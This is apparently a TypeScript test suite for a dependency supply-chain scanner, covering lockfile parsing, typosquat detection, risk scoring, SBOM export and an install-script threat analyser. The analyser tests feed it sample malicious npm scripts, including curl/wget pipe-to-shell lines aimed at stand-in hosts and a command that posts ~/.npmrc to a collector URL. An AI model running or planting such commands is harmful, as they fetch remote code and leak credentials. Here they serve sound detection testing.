import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  extractPackageNameFromPath,
  createUniqueNodeId,
  parseLockfile,
  parsePackageJsonDirect,
  parseRequirementsTxt,
  aggregateProjectManifests,
} from '../services/dependencyTree.js';
import { classifyManifestFile, isIgnoredPath } from '../services/github.js';
import { checkTyposquat } from '../services/typosquat.js';
import { checkDependencyConfusion } from '../services/dependencyConfusion.js';
import { scorePackage } from '../services/scoring.js';
import { generateCycloneDXSBOM } from '../services/sbom.js';
import { parseCvssVector } from '../services/osv.js';
import { simulateRemediation } from '../services/simulation.js';
import { analyzeScriptContent, analyzePackageScripts, MAX_SCRIPT_INPUT_BYTES } from '../services/behavioralAnalysis.js';
import type { Vulnerability, ReputationData, ProvenanceSignals, ScanResult } from '../types/index.js';

describe('Dependency Tree & Identity', () => {
  it('correctly parses scoped and unscoped package keys', () => {
    assert.equal(extractPackageNameFromPath('node_modules/lodash'), 'lodash');
    assert.equal(extractPackageNameFromPath('node_modules/@types/node'), '@types/node');
    assert.equal(extractPackageNameFromPath('node_modules/express/node_modules/accepts'), 'accepts');
    assert.equal(extractPackageNameFromPath('node_modules/express/node_modules/@types/node'), '@types/node');
  });

  it('generates consistent unique node identifiers', () => {
    const id = createUniqueNodeId('lodash', '4.17.20', 'node_modules/lodash');
    assert.equal(id, 'lodash@4.17.20#node_modules/lodash');
  });

  it('preserves distinct node identities for multiple versions of the same package', () => {
    const mockLockfile = {
      name: 'multi-version-test',
      version: '1.0.0',
      lockfileVersion: 3,
      packages: {
        '': {
          dependencies: {
            'express': '^4.18.2',
            'utility-a': '^1.0.0',
          },
        },
        'node_modules/utility-a': {
          version: '1.0.0',
          dependencies: {
            'lodash': '4.17.20',
          },
        },
        'node_modules/utility-a/node_modules/lodash': {
          version: '4.17.20',
        },
        'node_modules/utility-b': {
          version: '1.0.0',
          dependencies: {
            'lodash': '4.17.21',
          },
        },
        'node_modules/utility-b/node_modules/lodash': {
          version: '4.17.21',
        },
      },
    };

    const manifest = { name: 'multi-version-test', dependencies: { 'utility-a': '^1.0.0' } };
    const { packages: nodes, edges } = parseLockfile(mockLockfile, manifest);

    const lodashNodes = nodes.filter(n => n.name === 'lodash');
    assert.equal(lodashNodes.length, 2, 'Should have 2 distinct lodash nodes');
    assert.notEqual(lodashNodes[0].id, lodashNodes[1].id, 'Each node must have a unique ID');

    const versions = new Set(lodashNodes.map(n => n.version));
    assert.ok(versions.has('4.17.20'));
    assert.ok(versions.has('4.17.21'));
  });

  it('provides direct dependency fallback parsing when lockfile is absent', () => {
    const packageJson = {
      name: 'direct-fallback-test',
      dependencies: {
        'axios': '^1.6.0',
        'dotenv': '~16.3.1',
      },
      devDependencies: {
        'typescript': '^5.3.0',
      },
    };

    const { packages, edges } = parsePackageJsonDirect(packageJson);
    assert.equal(packages.length, 3, 'Should parse all 3 direct dependencies');
    assert.ok(packages.every((p) => p.isDirect && p.depth === 1), 'All nodes should be marked direct depth 1');
    assert.ok(packages.some((p) => p.name === 'axios' && p.version === '1.6.0'));
    assert.ok(packages.some((p) => p.name === 'dotenv' && p.version === '16.3.1'));
    assert.ok(packages.some((p) => p.name === 'typescript' && p.version === '5.3.0'));
  });
});

describe('Typosquatting Detection', () => {
  it('flags known typosquat variations of top packages', () => {
    const flag = checkTyposquat('reqeust');
    assert.ok(flag, 'Should flag reqeust');
    assert.equal(flag?.similarTo, 'request');
    assert.ok(flag?.similarity && flag.similarity >= 70);
    assert.equal(flag?.indicator, 'Possible typosquatting indicator');

    const flagAxios = checkTyposquat('axois');
    assert.ok(flagAxios, 'Should flag axois');
    assert.equal(flagAxios?.similarTo, 'axios');
  });

  it('does not flag legitimate popular or short core packages', () => {
    assert.equal(checkTyposquat('react'), null);
    assert.equal(checkTyposquat('express'), null);
    assert.equal(checkTyposquat('lodash'), null);
    // Core ecosystem packages that were previously false positives:
    assert.equal(checkTyposquat('qs'), null);
    assert.equal(checkTyposquat('send'), null);
    assert.equal(checkTyposquat('etag'), null);
    assert.equal(checkTyposquat('ip'), null);
    assert.equal(checkTyposquat('depd'), null);
    assert.equal(checkTyposquat('vary'), null);
    assert.equal(checkTyposquat('mime-types'), null);
  });
});

describe('CVSS v3.1 Vector Parsing', () => {
  it('calculates the exact base score conforming to the FIRST CVSS v3.1 specification', () => {
    // Critical network exploit: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H -> 9.8
    const scoreCritical = parseCvssVector('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H');
    assert.equal(scoreCritical, 9.8);

    // High network exploit with low privilege: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H -> 8.8
    const scoreHigh = parseCvssVector('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H');
    assert.equal(scoreHigh, 8.8);

    // Non-vector fallback
    const scoreFallback = parseCvssVector('invalid-string');
    assert.equal(scoreFallback, 0.0);
  });
});

describe('Dependency Confusion Detection', () => {
  it('flags internal company namespaces that risk public collision', () => {
    const flag = checkDependencyConfusion('@internal-secret-corp/auth-core', 'mycorp');
    assert.ok(flag, 'Should flag internal scoped package');
    assert.equal(flag?.confidence, 'high');
  });

  it('does not flag standard open-source scoped packages that exist publicly', () => {
    const flag = checkDependencyConfusion('@types/node');
    assert.equal(flag, undefined, 'Legitimate public package should not be flagged');
  });
});

describe('Contextual Risk Scoring Rubric', () => {
  const dummyReputation: ReputationData = {
    lastPublished: '2024-01-01',
    createdDate: '2020-01-01',
    packageAgeYears: 4,
    maintainerCount: 5,
    weeklyDownloads: 1000000,
    signals: ['Active maintainers'],
  };

  const dummyProvenance: ProvenanceSignals = {
    sourceRepo: 'Available',
    sourceRepoUrl: 'https://github.com/example/pkg',
    registryMetadata: 'Available',
    lockfileIntegrity: 'Present',
    buildAttestation: 'Not available',
  };

  it('separates advisory severity from contextual risk score', () => {
    const criticalVuln: Vulnerability = {
      id: 'CVE-2021-23337',
      source: 'OSV',
      summary: 'Command injection in lodash',
      cvss: 8.5,
      severity: 'HIGH',
      fixedIn: '4.17.21',
    };

    const { score: riskScore, advisorySeverity, tier: riskTier, breakdown } = scorePackage({
      id: 'lodash@4.17.20#node_modules/lodash',
      name: 'lodash',
      version: '4.17.20',
      isDirect: false,
      path: ['express', 'lodash'],
      depth: 3,
      dependentCount: 5, // High fan-out
      downstreamDependents: ['express'],
      riskScore: 0,
      advisorySeverity: 'NONE',
      riskTier: 'safe',
      riskBreakdown: {
        knownVulnerability: 0,
        severityContribution: 0,
        outdatedVersion: 0,
        transitiveExposure: 0,
        downstreamImpact: 0,
        typosquatConfusion: 0,
        totalScore: 0,
      },
      vulnerabilities: [criticalVuln],
      reputation: { ...dummyReputation, signals: ['Major release stale >2 yrs'] },
      provenance: dummyProvenance,
    });

    assert.equal(advisorySeverity, 'HIGH');
    assert.ok(riskScore >= 70, 'Contextual score should reflect blast radius');
    assert.equal(riskTier, 'critical');

    // Verify itemized breakdown
    assert.equal(breakdown.knownVulnerability, 40);
    assert.ok(breakdown.severityContribution > 10);
    assert.equal(breakdown.outdatedVersion, 10);
    assert.equal(breakdown.transitiveExposure, 8);
    assert.equal(breakdown.downstreamImpact, 8);
    assert.equal(breakdown.totalScore, riskScore);
  });

  it('caps risk score strictly at 100 points', () => {
    const maxVuln: Vulnerability = {
      id: 'CVE-9999-9999',
      source: 'OSV',
      summary: 'Extreme exploit',
      cvss: 10.0,
      severity: 'CRITICAL',
    };

    const { score: riskScore } = scorePackage({
      id: 'bad-pkg@1.0.0#node_modules/bad-pkg',
      name: 'bad-pkg',
      version: '1.0.0',
      isDirect: false,
      path: ['root', 'bad-pkg'],
      depth: 4,
      dependentCount: 10,
      downstreamDependents: ['a', 'b', 'c'],
      riskScore: 0,
      advisorySeverity: 'NONE',
      riskTier: 'safe',
      riskBreakdown: {
        knownVulnerability: 0,
        severityContribution: 0,
        outdatedVersion: 0,
        transitiveExposure: 0,
        downstreamImpact: 0,
        typosquatConfusion: 0,
        totalScore: 0,
      },
      vulnerabilities: [maxVuln],
      reputation: { ...dummyReputation, signals: ['Major release stale >2 yrs'] },
      provenance: dummyProvenance,
      typosquatFlag: {
        similarTo: 'popular-pkg',
        distance: 1,
        similarity: 90,
        indicator: 'Possible typosquatting indicator',
        reason: 'Typosquat',
      },
      confusionFlag: {
        indicator: 'Potential dependency-confusion risk',
        reason: 'Collision',
        confidence: 'high',
      },
    });

    assert.equal(riskScore, 100, 'Score must never exceed 100');
  });
});

describe('CycloneDX 1.5 JSON SBOM Export', () => {
  it('generates a valid, spec-compliant CycloneDX v1.5 document', () => {
    const mockScan: ScanResult = {
      scanId: 'test-scan-12345',
      repoUrl: 'https://github.com/acme/sample-api',
      owner: 'acme',
      repo: 'sample-api',
      branch: 'main',
      status: 'complete',
      overallRiskScore: 75,
      createdAt: new Date().toISOString(),
      packages: [
        {
          id: 'lodash@4.17.20#node_modules/lodash',
          name: 'lodash',
          version: '4.17.20',
          isDirect: false,
          depth: 2,
          dependentCount: 3,
          downstreamDependents: ['express'],
          path: ['express', 'lodash'],
          riskScore: 78,
          advisorySeverity: 'HIGH',
          riskTier: 'critical',
          riskBreakdown: {
            knownVulnerability: 40,
            severityContribution: 17,
            outdatedVersion: 10,
            transitiveExposure: 8,
            downstreamImpact: 8,
            typosquatConfusion: 0,
            totalScore: 78,
          },
          vulnerabilities: [
            {
              id: 'GHSA-35jh-r3h4-6jhm',
              source: 'GHSA',
              summary: 'Command injection',
              cvss: 8.5,
              severity: 'HIGH',
              fixedIn: '4.17.21',
            },
          ],
          reputation: {
            lastPublished: '2020-01-01',
            maintainerCount: 2,
            weeklyDownloads: 40000000,
            signals: [],
          },
          provenance: {
            sourceRepo: 'Available',
            sourceRepoUrl: 'https://github.com/lodash/lodash',
            registryMetadata: 'Available',
            lockfileIntegrity: 'Present',
            buildAttestation: 'Not available',
          },
        },
      ],
      edges: [
        { from: 'root', to: 'lodash@4.17.20#node_modules/lodash' },
      ],
    };

    const sbom = generateCycloneDXSBOM(mockScan);
    assert.equal(sbom.bomFormat, 'CycloneDX');
    assert.equal(sbom.specVersion, '1.5');
    assert.ok(sbom.metadata?.component);
    assert.equal(sbom.components?.length, 1);
    assert.equal(sbom.components?.[0].name, 'lodash');
    assert.equal(sbom.components?.[0].purl, 'pkg:npm/lodash@4.17.20');
    assert.equal(sbom.components?.[0]['bom-ref'], 'lodash@4.17.20#node_modules/lodash', 'Component must have valid bom-ref');
    assert.equal(sbom.vulnerabilities?.length, 1);
    assert.equal(sbom.vulnerabilities?.[0].id, 'GHSA-35jh-r3h4-6jhm');
    assert.equal(sbom.dependencies?.length, 1);
  });
});

describe('Evidence-Based Remediation Simulation', () => {
  it('mathematically simulates vulnerability resolution when patched version is available', () => {
    const vulnerablePkg = {
      id: 'lodash@4.17.20#node_modules/lodash',
      name: 'lodash',
      version: '4.17.20',
      isDirect: true,
      path: ['lodash'],
      depth: 1,
      dependentCount: 0,
      downstreamDependents: [],
      riskScore: 86,
      advisorySeverity: 'HIGH' as const,
      riskTier: 'critical' as const,
      riskBreakdown: {
        knownVulnerability: 40,
        severityContribution: 17,
        outdatedVersion: 10,
        transitiveExposure: 0,
        downstreamImpact: 0,
        typosquatConfusion: 0,
        totalScore: 86,
      },
      vulnerabilities: [
        {
          id: 'GHSA-35jh-r3h4-6jhm',
          source: 'GHSA' as const,
          summary: 'Command injection',
          cvss: 8.5,
          severity: 'HIGH' as const,
          fixedIn: '4.17.21',
        },
      ],
      reputation: {
        lastPublished: '2020-01-01',
        maintainerCount: 2,
        weeklyDownloads: 40000000,
        signals: [],
      },
      provenance: {
        sourceRepo: 'Available' as const,
        sourceRepoUrl: 'https://github.com/lodash/lodash',
        registryMetadata: 'Available' as const,
        lockfileIntegrity: 'Present' as const,
        buildAttestation: 'Not available' as const,
      },
    };

    const simulation = simulateRemediation([vulnerablePkg]);
    assert.equal(simulation.simulatedPackages.length, 1);
    assert.equal(simulation.resolvedVulnCount, 1, 'Should resolve 1 vulnerability');

    const simulated = simulation.simulatedPackages[0];
    assert.equal(simulated.isRemediated, true);
    assert.ok(simulated.ptsReduced > 0, 'Risk score should decrease');
    assert.ok(simulated.projectedRiskScore < simulated.riskScore, 'Projected risk score should be lower than original');
    assert.ok(simulation.projectedOverallScore < simulation.currentOverallScore, 'Overall repository risk should drop');
  });
});

describe('Server-Side Authorization & Tenant Isolation', () => {
  it('blocks unauthenticated requests missing Bearer token', async () => {
    const { requireAuth } = await import('../middleware/auth.js');
    let status = 0;
    let responseBody: any = null;

    const req: any = { headers: {} };
    const res: any = {
      status: (s: number) => {
        status = s;
        return {
          json: (b: any) => {
            responseBody = b;
          },
        };
      },
    };
    let nextCalled = false;
    const next = () => {
      nextCalled = true;
    };

    await requireAuth(req, res, next);
    assert.equal(status, 401);
    assert.ok(responseBody?.error?.includes('Unauthorized'));
    assert.equal(nextCalled, false);
  });

  it('authenticates valid tokens and derives req.user server-side', async () => {
    process.env.NODE_ENV = 'test';
    const { requireAuth } = await import('../middleware/auth.js');
    const req: any = {
      headers: { authorization: 'Bearer test-token-secops-user-42' },
    };
    const res: any = {
      status: () => res,
      json: () => {},
    };
    let nextCalled = false;
    const next = () => {
      nextCalled = true;
    };

    await requireAuth(req, res, next);
    assert.equal(nextCalled, true);
    assert.equal(req.user?.id, 'secops-user-42');
    assert.equal(req.user?.email, 'secops-user-42@supplyguard.internal');
  });

  it('enforces tenant isolation preventing cross-user scan retrieval', () => {
    const userAScan: ScanResult = {
      scanId: 'scan-user-a',
      userId: 'user-a',
      repoUrl: 'https://github.com/org/repo-a',
      status: 'complete',
      overallRiskScore: 45,
      packages: [],
      edges: [],
      createdAt: new Date().toISOString(),
    };

    const callerUserId = 'user-b';
    // Verification logic identical to GET /api/scans/:id route
    const isAuthorized = userAScan.userId === callerUserId;
    assert.equal(isAuthorized, false, 'User B must not be authorized to view User A scan');
  });
});

describe('Behavioral Threat Signals Engine (Static Heuristics)', () => {
  it('returns clean signal for empty or non-existent script', () => {
    const res = analyzeScriptContent('install', '');
    assert.equal(res.isSuspicious, false);
    assert.equal(res.confidence, 'none');
    assert.equal(res.indicators.length, 0);
  });

  it('allows legitimate developer tooling without flagging (husky, node-gyp, patch-package, esbuild)', () => {
    const husky = analyzeScriptContent('postinstall', 'husky install');
    assert.equal(husky.isAllowListed, true);
    assert.equal(husky.isSuspicious, false);
    assert.equal(husky.confidence, 'none');

    const gyp = analyzeScriptContent('install', 'node-gyp rebuild');
    assert.equal(gyp.isAllowListed, true);
    assert.equal(gyp.isSuspicious, false);

    const patch = analyzeScriptContent('postinstall', 'patch-package');
    assert.equal(patch.isAllowListed, true);
    assert.equal(patch.isSuspicious, false);

    const esbuild = analyzeScriptContent('postinstall', 'node install.js && esbuild --bundle');
    assert.equal(esbuild.isAllowListed, true);
    assert.equal(esbuild.isSuspicious, false);
  });

  it('strictly prevents allow-list bypass when strong threats are attached', () => {
    // Prefixing with "husky" must NOT bypass detection if curl | bash is present
    const bypassAttempt = analyzeScriptContent('postinstall', 'echo "husky install" && curl -sL https://evil-payload.site/x | bash');
    assert.equal(bypassAttempt.isSuspicious, true, 'Must flag bypass attempt');
    assert.equal(bypassAttempt.confidence, 'high');
    assert.ok(bypassAttempt.indicators.includes('pipe-to-shell'));
    assert.equal(bypassAttempt.isAllowListed, false, 'Must not allow-list scripts with strong threats');
  });

  it('flags synthetic pipe-to-shell patterns with HIGH confidence', () => {
    const curlBash = analyzeScriptContent('postinstall', 'curl -sL https://cdn.malicious-domain.test/run.sh | sh');
    assert.equal(curlBash.isSuspicious, true);
    assert.equal(curlBash.confidence, 'high');
    assert.ok(curlBash.indicators.includes('pipe-to-shell'));
    assert.ok(curlBash.indicators.includes('network-activity'));
    assert.ok(curlBash.excerpt.length > 0 && curlBash.excerpt.length <= 120);

    const wgetBash = analyzeScriptContent('preinstall', 'wget -qO- https://threat.example/bootstrap | bash');
    assert.equal(wgetBash.isSuspicious, true);
    assert.equal(wgetBash.confidence, 'high');
    assert.ok(wgetBash.indicators.includes('pipe-to-shell'));
  });

  it('flags synthetic obfuscation with HIGH confidence', () => {
    const obfuscated = analyzeScriptContent(
      'preinstall',
      'eval(Buffer.from("Y29uc29sZS5sb2coIm1hbHdhcmUiKQ==", "base64").toString("utf-8"))'
    );
    assert.equal(obfuscated.isSuspicious, true);
    assert.equal(obfuscated.confidence, 'high');
    assert.ok(obfuscated.indicators.includes('obfuscated-execution'));
  });

  it('does NOT flag harmless process.env checks alone', () => {
    const envCheck = analyzeScriptContent('postinstall', 'node -e "if (process.env.NODE_ENV === \'production\') console.log(\'prod\')"');
    assert.equal(envCheck.isSuspicious, false, 'Standalone process.env must not flag');
    assert.equal(envCheck.confidence, 'none');
  });

  it('does NOT flag harmless documentation URLs alone', () => {
    const docUrl = analyzeScriptContent('postinstall', 'echo "See https://github.com/project/repo for details"');
    assert.equal(docUrl.isSuspicious, false, 'Standalone doc URLs must not flag');
    assert.equal(docUrl.confidence, 'none');
  });

  it('flags sensitive file exfiltration attempt with HIGH confidence', () => {
    const exfil = analyzeScriptContent('postinstall', 'cat ~/.npmrc | curl -X POST -d @- https://leak.example.test/collector');
    assert.equal(exfil.isSuspicious, true);
    assert.equal(exfil.confidence, 'high');
    assert.ok(exfil.indicators.includes('sensitive-path'));
    assert.ok(exfil.indicators.includes('network-activity'));
  });

  it('analyzes multi-stage package scripts correctly', () => {
    const scripts = {
      preinstall: 'node -v',
      install: 'node-gyp rebuild',
      postinstall: 'curl -fsSL https://evil.example.com/bin | bash',
    };

    const analysis = analyzePackageScripts(scripts);
    assert.equal(analysis.behavioralFlags.length, 1);
    assert.equal(analysis.behavioralFlags[0].scriptStage, 'postinstall');
    assert.equal(analysis.behavioralFlags[0].confidence, 'high');
  });

  it('safely rejects oversized inputs (> 50 KB) without crashing', () => {
    const hugeInput = 'echo "hello" '.repeat(5000); // > 60 KB
    assert.ok(Buffer.byteLength(hugeInput, 'utf-8') > MAX_SCRIPT_INPUT_BYTES);

    const result = analyzeScriptContent('install', hugeInput);
    assert.equal(result.isSuspicious, false);
    assert.equal(result.confidence, 'none');
    assert.ok(result.explanation.includes('Input exceeded maximum static analysis limit'));
  });

  it('integrates into risk scoring without disturbing existing lodash score', () => {
    // 1. Verify clean package scoring
    const dummyReputation: ReputationData = {
      lastPublished: new Date().toISOString(),
      createdDate: new Date().toISOString(),
      packageAgeYears: 0.5,
      maintainerCount: 5,
      weeklyDownloads: 1000000,
      signals: [],
    };
    const dummyProvenance: ProvenanceSignals = {
      sourceRepo: 'Available',
      sourceRepoUrl: 'https://github.com/example/pkg',
      registryMetadata: 'Available',
      lockfileIntegrity: 'Present',
      buildAttestation: 'Not available',
    };

    const cleanPkg = scorePackage({
      id: 'clean-pkg@1.0.0#node_modules/clean-pkg',
      name: 'clean-pkg',
      version: '1.0.0',
      isDirect: true,
      path: ['clean-pkg'],
      depth: 1,
      dependentCount: 0,
      downstreamDependents: [],
      riskScore: 0,
      advisorySeverity: 'NONE',
      riskTier: 'safe',
      riskBreakdown: {
        knownVulnerability: 0,
        severityContribution: 0,
        outdatedVersion: 0,
        transitiveExposure: 0,
        downstreamImpact: 0,
        typosquatConfusion: 0,
        behavioralSignal: 0,
        totalScore: 0,
      },
      vulnerabilities: [],
      reputation: dummyReputation,
      provenance: dummyProvenance,
    });
    assert.equal(cleanPkg.score, 0);
    assert.equal(cleanPkg.breakdown.behavioralSignal, 0);

    // 2. Add high behavioral threat flag -> +25 points
    const flaggedPkg = scorePackage({
      id: 'flagged-pkg@1.0.0#node_modules/flagged-pkg',
      name: 'flagged-pkg',
      version: '1.0.0',
      isDirect: true,
      path: ['flagged-pkg'],
      depth: 1,
      dependentCount: 0,
      downstreamDependents: [],
      riskScore: 0,
      advisorySeverity: 'NONE',
      riskTier: 'safe',
      riskBreakdown: {
        knownVulnerability: 0,
        severityContribution: 0,
        outdatedVersion: 0,
        transitiveExposure: 0,
        downstreamImpact: 0,
        typosquatConfusion: 0,
        behavioralSignal: 0,
        totalScore: 0,
      },
      vulnerabilities: [],
      reputation: dummyReputation,
      provenance: dummyProvenance,
      behavioralFlags: [
        {
          indicator: 'Suspicious install-script behavior',
          matchedSignals: ['Pipe-to-shell behavior'],
          scriptStage: 'postinstall',
          confidence: 'high',
          indicators: ['pipe-to-shell', 'network-activity'],
          excerpt: 'curl https://x | bash',
          explanation: 'Pipe to shell detected',
        },
      ],
    });
    assert.equal(flaggedPkg.score, 25);
    assert.equal(flaggedPkg.breakdown.behavioralSignal, 25);
  });

  it('correctly maps standardized 5 risk tiers based on thresholds', () => {
    const dummyReputation: ReputationData = {
      lastPublished: new Date().toISOString(),
      createdDate: new Date().toISOString(),
      packageAgeYears: 3,
      maintainerCount: 5,
      weeklyDownloads: 1000000,
      signals: [],
    };
    const dummyProvenance: ProvenanceSignals = {
      sourceRepo: 'Available',
      sourceRepoUrl: 'https://github.com/example/pkg',
      registryMetadata: 'Available',
      lockfileIntegrity: 'Present',
      buildAttestation: 'Not available',
    };

    // Safe (score: 0)
    const safePkg = scorePackage({
      id: 'safe@1.0.0#node_modules/safe',
      name: 'safe',
      version: '1.0.0',
      isDirect: true,
      path: ['safe'],
      depth: 1,
      dependentCount: 0,
      downstreamDependents: [],
      riskScore: 0,
      advisorySeverity: 'NONE',
      riskTier: 'safe',
      riskBreakdown: {
        knownVulnerability: 0, severityContribution: 0, outdatedVersion: 0,
        transitiveExposure: 0, downstreamImpact: 0, typosquatConfusion: 0,
        behavioralSignal: 0, totalScore: 0,
      },
      vulnerabilities: [],
      reputation: dummyReputation,
      provenance: dummyProvenance,
    });
    assert.equal(safePkg.tier, 'safe');

    // Low (score: 25)
    const lowPkg = scorePackage({
      id: 'low@1.0.0#node_modules/low',
      name: 'low',
      version: '1.0.0',
      isDirect: true,
      path: ['low'],
      depth: 1,
      dependentCount: 0,
      downstreamDependents: [],
      riskScore: 0,
      advisorySeverity: 'NONE',
      riskTier: 'safe',
      riskBreakdown: {
        knownVulnerability: 0, severityContribution: 0, outdatedVersion: 0,
        transitiveExposure: 0, downstreamImpact: 0, typosquatConfusion: 0,
        behavioralSignal: 0, totalScore: 0,
      },
      vulnerabilities: [],
      reputation: dummyReputation,
      provenance: dummyProvenance,
      behavioralFlags: [
        {
          indicator: 'Suspicious script',
          matchedSignals: ['Network activity'],
          scriptStage: 'postinstall',
          confidence: 'high',
          indicators: ['network-activity'],
          excerpt: 'curl x',
          explanation: 'network',
        },
      ],
    });
    assert.equal(lowPkg.tier, 'low');
  });
});

describe('npm Lockfile v1 Support', () => {
  it('correctly parses npm v5/v6 lockfileVersion 1 with nested dependencies', () => {
    const mockLockfileV1 = {
      name: 'v1-project',
      version: '1.0.0',
      lockfileVersion: 1,
      dependencies: {
        'express': {
          version: '4.17.1',
          integrity: 'sha512-xxx',
          requires: {
            'accepts': '~1.3.7',
          },
          dependencies: {
            'accepts': {
              version: '1.3.7',
              integrity: 'sha512-yyy',
            },
          },
        },
        'lodash': {
          version: '4.17.21',
          integrity: 'sha512-zzz',
        },
      },
    };

    const manifest = {
      dependencies: {
        'express': '^4.17.1',
        'lodash': '^4.17.21',
      },
    };

    const { packages, edges } = parseLockfile(mockLockfileV1, manifest);

    assert.equal(packages.length, 3, 'Should extract express, lodash, and nested accepts');
    const expressPkg = packages.find((p) => p.name === 'express');
    const lodashPkg = packages.find((p) => p.name === 'lodash');
    const acceptsPkg = packages.find((p) => p.name === 'accepts');

    assert.ok(expressPkg && expressPkg.isDirect && expressPkg.depth === 1);
    assert.ok(lodashPkg && lodashPkg.isDirect && lodashPkg.depth === 1);
    assert.ok(acceptsPkg && !acceptsPkg.isDirect && acceptsPkg.depth === 2);

    // Verify edges connect root -> express, root -> lodash, express -> accepts
    assert.ok(edges.some((e) => e.from === 'root' && e.to === expressPkg?.id));
    assert.ok(edges.some((e) => e.from === 'root' && e.to === lodashPkg?.id));
    assert.ok(edges.some((e) => e.from === expressPkg?.id && e.to === acceptsPkg?.id));
  });
});

describe('CycloneDX SBOM Validation', () => {
  it('validates CycloneDX v1.5 schema requirements including metadata.component bom-ref', () => {
    const mockScan: ScanResult = {
      scanId: 'sbom-test-123',
      repoUrl: 'https://github.com/test-org/test-repo',
      owner: 'test-org',
      repo: 'test-repo',
      branch: 'main',
      status: 'complete',
      overallRiskScore: 0,
      createdAt: new Date().toISOString(),
      packages: [
        {
          id: 'lodash@4.17.21#node_modules/lodash',
          name: 'lodash',
          version: '4.17.21',
          isDirect: true,
          path: ['lodash'],
          depth: 1,
          dependentCount: 0,
          downstreamDependents: [],
          riskScore: 0,
          advisorySeverity: 'NONE',
          riskTier: 'safe',
          riskBreakdown: {
            knownVulnerability: 0,
            severityContribution: 0,
            outdatedVersion: 0,
            transitiveExposure: 0,
            downstreamImpact: 0,
            typosquatConfusion: 0,
            behavioralSignal: 0,
            totalScore: 0,
          },
          vulnerabilities: [],
          reputation: {
            lastPublished: new Date().toISOString(),
            createdDate: new Date().toISOString(),
            packageAgeYears: 5,
            maintainerCount: 3,
            weeklyDownloads: 50000000,
            signals: [],
          },
          provenance: {
            sourceRepo: 'Available',
            sourceRepoUrl: 'https://github.com/lodash/lodash',
            registryMetadata: 'Available',
            lockfileIntegrity: 'Present',
            buildAttestation: 'Not available',
          },
        },
      ],
      edges: [
        { from: 'root', to: 'lodash@4.17.21#node_modules/lodash' },
      ],
      limitations: [],
      completedAt: new Date().toISOString(),
    };

    const sbom = generateCycloneDXSBOM(mockScan);
    assert.equal(sbom.bomFormat, 'CycloneDX');
    assert.equal(sbom.specVersion, '1.5');
    assert.equal(sbom.metadata?.component?.['bom-ref'], 'root', 'Root metadata component must have bom-ref root');

    // Dependencies section must reference root
    const rootDep = sbom.dependencies?.find((d: any) => d.ref === 'root');
    assert.ok(rootDep, 'Dependencies list must have ref: root');
    assert.ok(rootDep.dependsOn?.includes('lodash@4.17.21#node_modules/lodash'));
  });
});

describe('Multi-Manifest & Multi-Project Aggregation', () => {
  it('correctly discovers and classifies manifest types while ignoring non-project paths', () => {
    assert.ok(classifyManifestFile('package.json').isManifest);
    assert.equal(classifyManifestFile('package.json').ecosystem, 'npm');
    assert.ok(classifyManifestFile('requirements.txt').isManifest);
    assert.equal(classifyManifestFile('requirements.txt').ecosystem, 'PyPI');
    assert.ok(classifyManifestFile('Pipfile.lock').isManifest);
    assert.equal(classifyManifestFile('Pipfile.lock').ecosystem, 'PyPI');
    assert.ok(classifyManifestFile('poetry.lock').isManifest);
    assert.equal(classifyManifestFile('poetry.lock').ecosystem, 'PyPI');

    assert.ok(isIgnoredPath('node_modules/lodash/package.json'));
    assert.ok(isIgnoredPath('.venv/lib/python3.10/site-packages/requirements.txt'));
    assert.ok(isIgnoredPath('bower_components/webcomponentsjs/package.json'));
    assert.ok(isIgnoredPath('.git/HEAD'));
    assert.ok(!isIgnoredPath('frontend/package.json'));
    assert.ok(!isIgnoredPath('backend/requirements.txt'));
  });

  it('parses Python requirements.txt distinguishing exact versions from ranges', () => {
    const content = `
fastapi==0.115.6
uvicorn[standard]==0.34.0
requests>=2.30.0
flask~=3.0.0
# via pip-compile comment
click==8.1.7 # via flask
`;
    const result = parseRequirementsTxt(content, 'backend', 'backend/requirements.txt');
    assert.equal(result.packages.length, 5);

    const fastapi = result.packages.find((p) => p.name === 'fastapi');
    assert.ok(fastapi);
    assert.equal(fastapi.version, '0.115.6');
    assert.equal(fastapi.isDirect, true);
    assert.equal(fastapi.ecosystem, 'PyPI');

    const requests = result.packages.find((p) => p.name === 'requests');
    assert.ok(requests);
    assert.equal(requests.version, '>=2.30.0', 'Must not invent resolved version for range');

    const click = result.packages.find((p) => p.name === 'click');
    assert.ok(click);
    assert.equal(click.isDirect, false, 'Dependency with # via comment must be marked transitive');
    assert.equal(result.resolutionStatus, 'locked');
  });

  it('aggregates multi-project manifests into separate project summaries and distinct occurrences', () => {
    const mockManifests = [
      {
        path: 'frontend/package.json',
        fileName: 'package.json',
        directory: 'frontend',
        project: 'frontend',
        ecosystem: 'npm' as const,
        rawContent: JSON.stringify({
          name: 'frontend',
          dependencies: { 'lodash': '^4.17.21', 'axios': '^1.6.0' },
        }),
      },
      {
        path: 'backend/requirements.txt',
        fileName: 'requirements.txt',
        directory: 'backend',
        project: 'backend',
        ecosystem: 'PyPI' as const,
        rawContent: 'fastapi==0.115.6\nsqlalchemy==2.0.36\n',
      },
      {
        path: 'package.json',
        fileName: 'package.json',
        directory: 'root',
        project: 'root',
        ecosystem: 'npm' as const,
        rawContent: JSON.stringify({
          name: 'root-scripts',
          scripts: { 'dev': 'echo running' },
        }),
      },
    ];

    const aggregated = aggregateProjectManifests(mockManifests);

    assert.equal(aggregated.projectSummaries.length, 2, 'Should summarize frontend and backend (skipping empty root)');
    assert.equal(aggregated.packages.length, 4, 'Should contain 2 frontend packages + 2 backend packages');

    const frontendSummary = aggregated.projectSummaries.find((p) => p.projectName === 'frontend');
    assert.ok(frontendSummary);
    assert.equal(frontendSummary.ecosystem, 'npm');
    assert.equal(frontendSummary.directDependencies, 2);

    const backendSummary = aggregated.projectSummaries.find((p) => p.projectName === 'backend');
    assert.ok(backendSummary);
    assert.equal(backendSummary.ecosystem, 'pypi');
    assert.equal(backendSummary.directDependencies, 2);
    assert.equal(backendSummary.transitiveDependencies, 'unavailable');

    // Requirement 9: Distinct project provenance
    const feLodash = aggregated.packages.find((p) => p.name === 'lodash');
    assert.ok(feLodash);
    assert.equal(feLodash.project, 'frontend');
    assert.ok(feLodash.id.startsWith('frontend:'));
  });
});


